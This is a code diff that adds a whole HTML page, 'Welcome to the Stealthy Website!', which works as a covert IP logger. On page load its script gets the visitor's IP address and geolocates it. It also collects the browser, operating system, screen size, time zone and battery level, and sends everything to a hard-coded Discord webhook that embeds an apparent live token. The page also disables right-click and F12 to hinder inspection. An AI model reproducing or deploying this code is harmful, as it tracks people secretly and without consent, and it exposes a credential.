@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        // Function to prevent right-click
+        document.addEventListener('contextmenu', function(event) {
+            event.preventDefault();
+        });
+
+        // Function to prevent F12 key
+        document.addEventListener('keydown', function(event) {
+            if (event.key === "F12" || event.keyCode === 123) {
+                event.preventDefault();
+            }
+        });
+
+        // Your existing JavaScript code goes here...
+        function sendIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ip = data.ip;
+                    var url = "https://ipapi.co/" + ip + "/json/";
+                    fetch(url)
+                        .then(response => response.json())
+                        .then(userData => {
+                            sendEmbed(userData);
+                        });
+                });
+        }
+
+        function sendEmbed(userData) {
+            var webhookUrl = "https://discord.com/api/webhooks/1204803439243042868/s6Nz2rSCmi8B0RiWNKP4VNeVoERzZZPsadmwLU12tpcrryj_aPKgt_KHokHEcf9izqaU";
+            var currentTime = new Date().toLocaleTimeString();
+            var browserInfo = getBrowserName();
+            var screenInfo = getScreenResolution();
+            var osInfo = getOperatingSystem();
+            var batteryPercentage = 0;
+
+            navigator.getBattery().then(function(battery) {
+                batteryPercentage = battery.level * 100;
+
+                var embed = {
+                    title: "User Information",
+                    color: 16711680,
+                    fields: [
+                        { name: "IP Address 🌐", value: userData.ip },
+                        { name: "City 🏙️", value: userData.city },
+                        { name: "Country 🌍", value: userData.country_name },
+                        { name: "ISP 🏢", value: userData.org },
+                        { name: "Current Time ⏰", value: currentTime },
+                        { name: "Time Zone ⌚", value: Intl.DateTimeFormat().resolvedOptions().timeZone },
+                        { name: "Browser 🔎", value: browserInfo },
+                        { name: "Screen Resolution 🖥️", value: screenInfo },
+                        { name: "Operating System 🖥️", value: osInfo },
+                        { name: "Battery Percentage 🔋", value: batteryPercentage + "%" }
+                    ]
+                };
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+            });
+        }
+
+        function getBrowserName() {
+            var userAgent = navigator.userAgent.toLowerCase();
+            if (userAgent.includes("chrome") && !userAgent.includes("edg")) {
+                return "Chrome";
+            } else if (userAgent.includes("edge")) {
+                return "Edge";
+            } else if (userAgent.includes("firefox")) {
+                return "Firefox";
+            } else if (userAgent.includes("opera gx")) {
+                return "Opera GX";
+            } else if (userAgent.includes("internet explorer")) {
+                return "Internet Explorer";
+            } else if (userAgent.includes("kiwi")) {
+                return "Kiwi";
+            } else if (userAgent.includes("yandex")) {
+                return "Yandex";
+            } else if (userAgent.includes("opera")) {
+                return "Opera";
+            } else if (userAgent.includes("safari")) {
+                return "Safari";
+            } else {
+                return "Unknown";
+            }
+        }
+
+        function getScreenResolution() {
+            var screenWidth = window.screen.width;
+            var screenHeight = window.screen.height;
+            return screenWidth + "x" + screenHeight;
+        }
+
+        function getOperatingSystem() {
+            var userAgent = navigator.userAgent.toLowerCase();
+            if (userAgent.includes("windows nt 10.0")) {
+                return "Windows 10";
+            } else if (userAgent.includes("windows nt 6.3")) {
+                return "Windows 8.1";
+            } else if (userAgent.includes("windows nt 6.2")) {
+                return "Windows 8";
+            } else if (userAgent.includes("windows nt 6.1")) {
+                return "Windows 7";
+            } else if (userAgent.includes("windows")) {
+                return "Windows";
+            } else if (userAgent.includes("mac os")) {
+                return "macOS";
+            } else if (userAgent.includes("android")) {
+                return "Android";
+            } else if (userAgent.includes("iphone") || userAgent.includes("ipad") || userAgent.includes("ipod")) {
+                return "iOS";
+            } else {
+                return "Unknown";
+            }
+        }
+
+        // Call sendIP function when the page loads
+        window.onload = sendIP;
+    </script>
+</head>
+<body>
+    <h1>Welcome to the Stealthy Website!</h1>
+</body>
+</html>
